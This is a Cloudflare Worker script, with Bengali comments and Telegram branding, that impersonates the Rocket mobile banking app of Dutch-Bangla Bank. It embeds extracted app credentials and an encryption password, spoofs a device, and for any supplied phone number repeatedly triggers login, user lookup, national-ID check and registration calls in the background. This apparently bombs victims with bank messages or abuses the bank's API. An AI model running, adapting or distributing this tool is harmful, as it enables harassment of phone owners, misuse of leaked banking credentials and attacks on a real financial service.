export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const phone = url.searchParams.get('phone');
    const DEFAULT_NID = "5845888855";
    const nid = url.searchParams.get('nid') || DEFAULT_NID;

    // ফোন নম্বর ভ্যালিডেশন
    if (!phone || phone.trim() === '') {
      return new Response(
        JSON.stringify({
          error: "Phone number required",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    if (!/^01[0-9]{9}$/.test(phone)) {
      return new Response(
        JSON.stringify({
          error: "Invalid phone number",
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 400, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }

    const API_PASSWORD = "sdfheu$*sdfGw2";
    const BASIC_AUTH = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj";
    const BASE_URL = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1";
    const DEVICE_ID = "ANDROID-01968184976";
    const DEVICE_INFO = "SP1A.210812.016-itel S665L";
    const CLIENT_VERSION = "3.1.6";

    // PBKDF2 Key Generation (Web Crypto API)
    async function getKey(saltBuffer) {
      const enc = new TextEncoder();
      const keyMaterial = await crypto.subtle.importKey(
        "raw",
        enc.encode(API_PASSWORD),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
      );
      return await crypto.subtle.deriveKey(
        {
          name: "PBKDF2",
          salt: saltBuffer,
          iterations: 65536,
          hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt", "decrypt"]
      );
    }

    // Payload Encryption (AES-256-GCM)
    async function encryptPayload(payload) {
      const plaintext = new TextEncoder().encode(JSON.stringify(payload));
      const iv = crypto.getRandomValues(new Uint8Array(16));
      const salt = crypto.getRandomValues(new Uint8Array(16));
      const key = await getKey(salt);

      const ciphertext = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        plaintext
      );

      const combined = new Uint8Array(iv.length + salt.length + ciphertext.byteLength);
      combined.set(iv, 0);
      combined.set(salt, iv.length);
      combined.set(new Uint8Array(ciphertext), iv.length + salt.length);

      let binary = "";
      const len = combined.byteLength;
      for (let i = 0; i < len; i++) {
        binary += String.fromCharCode(combined[i]);
      }
      return btoa(binary);
    }

    // Payload Decryption (AES-256-GCM)
    async function decryptPayload(b64) {
      const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
      const iv = raw.slice(0, 16);
      const salt = raw.slice(16, 32);
      const ciphertext = raw.slice(32);
      const key = await getKey(salt);

      const decrypted = await crypto.subtle.decrypt(
        { name: "AES-GCM", iv: iv, tagLength: 128 },
        key,
        ciphertext
      );

      const decodedString = new TextDecoder().decode(decrypted);
      return JSON.parse(decodedString);
    }

    function makeRefId(prefix = "login") {
      const now = Date.now();
      const dateObj = new Date(now);
      const dt = dateObj.toISOString().replace(/[-:T]/g, '').slice(0, 14);
      const ms = String(now % 1000).padStart(3, '0');
      return `${prefix}--${dt}${ms}`;
    }

    function sleep(ms) {
      return new Promise(resolve => setTimeout(resolve, ms));
    }

    async function apiCall(endpoint, payload, token = null) {
      const headers = {
        "Authorization": token ? `Bearer ${token}` : `Basic ${BASIC_AUTH}`,
        "CHANNEL_ID": "ROCKET_APP_USER",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "rocket-consumertxnservice.dutchbanglabank.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
      };

      const encrypted = await encryptPayload(payload);
      const body = JSON.stringify({ userData: encrypted });

      const response = await fetch(`${BASE_URL}/${endpoint}`, {
        method: "POST",
        headers: headers,
        body: body,
      });

      const respText = await response.text();
      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${respText}`);
      }

      const result = JSON.parse(respText);
      if (result.userData && result.userData !== "") {
        return await decryptPayload(result.userData);
      }
      return result;
    }

    // প্রতিবার রিকোয়েস্ট পাঠানোর মূল লজিক ফাংশন
    async function executeProcess() {
      const loginResp = await apiCall("login", {
        apiId: 102,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("login"),
        sessionId: "123",
        clientLanguage: "EN",
        data: {
          appType: "C",
          rocketSessionId: "1234",
          userId: phone,
          version: CLIENT_VERSION
        },
      });

      if ((loginResp.status || '') !== 'SUCCESS') {
        return { step: "login", status: "FAILED", message: loginResp.message || '' };
      }

      const token = loginResp.data.accessToken;
      const sessionId = loginResp.data.sessionId;

      const svcPayload = {
        apiId: 3042,
        deviceId: DEVICE_ID,
        deviceInfo: DEVICE_INFO,
        clientVersion: CLIENT_VERSION,
        refId: makeRefId("reg-init"),
        sessionId: sessionId,
        clientLanguage: "EN",
        data: {
          appType: "C",
          initiatorId: phone,
          rocketSessionId: "7654321",
          userId: "",
          version: CLIENT_VERSION,
          deviceType: "ANDROID"
        },
      };

      const userResp = await apiCall("userService", svcPayload, token);
      const userType = (userResp.data || []).userType || '?';
      const promtUser = (userResp.data || []).promtUser || '';

      let stepResult = {
        step: "userService",
        status: userResp.status || '',
        userType: userType,
        promtUser: promtUser,
        message: userResp.message || ''
      };

      if ((userResp.status || '') !== 'SUCCESS') {
        return { success: false, error: userResp.message || 'userService failed', stepResult };
      }

      let extraSteps = [];
      if (userType === 'NEW') {
        const nidResp = await apiCall("userService", {
          apiId: 3002,
          deviceId: DEVICE_ID,
          deviceInfo: DEVICE_INFO,
          clientVersion: CLIENT_VERSION,
          refId: makeRefId("nid-check"),
          sessionId: sessionId,
          clientLanguage: "EN",
          data: { nidNo: nid, initiatorId: phone },
        }, token);

        extraSteps.push({ step: "nid_check", status: nidResp.status || '', message: nidResp.message || '' });

        try {
          const finalResp = await apiCall("userService", {
            apiId: 3034,
            deviceId: DEVICE_ID,
            deviceInfo: DEVICE_INFO,
            clientVersion: CLIENT_VERSION,
            refId: makeRefId("reg-init"),
            sessionId: "123",
            clientLanguage: "EN",
            data: {
              appType: "C",
              initiatorId: phone,
              rocketSessionId: "7654321",
              userId: "",
              version: CLIENT_VERSION,
              deviceType: "ANDROID"
            },
          }, token);
          extraSteps.push({ step: "final_trigger", status: finalResp.status || '', message: finalResp.message || '' });
        } catch (err) {
          extraSteps.push({ step: "final_trigger", status: "ERROR", message: err.message });
        }
      }

      return {
        success: true,
        userType,
        promtUser,
        stepResult,
        extraSteps
      };
    }

    // ব্যাকগ্রাউন্ডে ৫ বার রিকোয়েস্ট চালানোর ফাংশন (পাওয়ার ও রিট্রাইসহ)
    async function runBackgroundFiveTimes() {
      const totalRuns = 5;

      for (let i = 1; i <= totalRuns; i++) {
        let completed = false;
        for (let attempt = 1; attempt <= 2 && !completed; attempt++) {
          try {
            const res = await executeProcess();
            if (res && res.success !== false) {
              completed = true;
            } else if (attempt === 1) {
              await sleep(300);
            }
          } catch (err) {
            if (attempt === 1) {
              await sleep(300);
            }
          }
        }

        if (i < totalRuns) {
          await sleep(200);
        }
      }
    }

    try {
      ctx.waitUntil(runBackgroundFiveTimes());

      return new Response(JSON.stringify({
        phone: phone,
        nid: nid,
        success: true,
        Api_Owner: '@MehediSanix',
        Telegram: '@CobraX_Empire',
        Developer: '@XrootCodeX'
      }, null, 2), {
        status: 200,
        headers: { 'Content-Type': 'application/json; charset=utf-8' }
      });

    } catch (error) {
      return new Response(
        JSON.stringify({
          phone,
          nid,
          success: false,
          error: error.message,
          Api_Owner: '@MehediSanix',
          Telegram: '@CobraX_Empire',
          Developer: '@XrootCodeX'
        }, null, 2),
        { status: 500, headers: { 'Content-Type': 'application/json; charset=utf-8' } }
      );
    }
  }
};
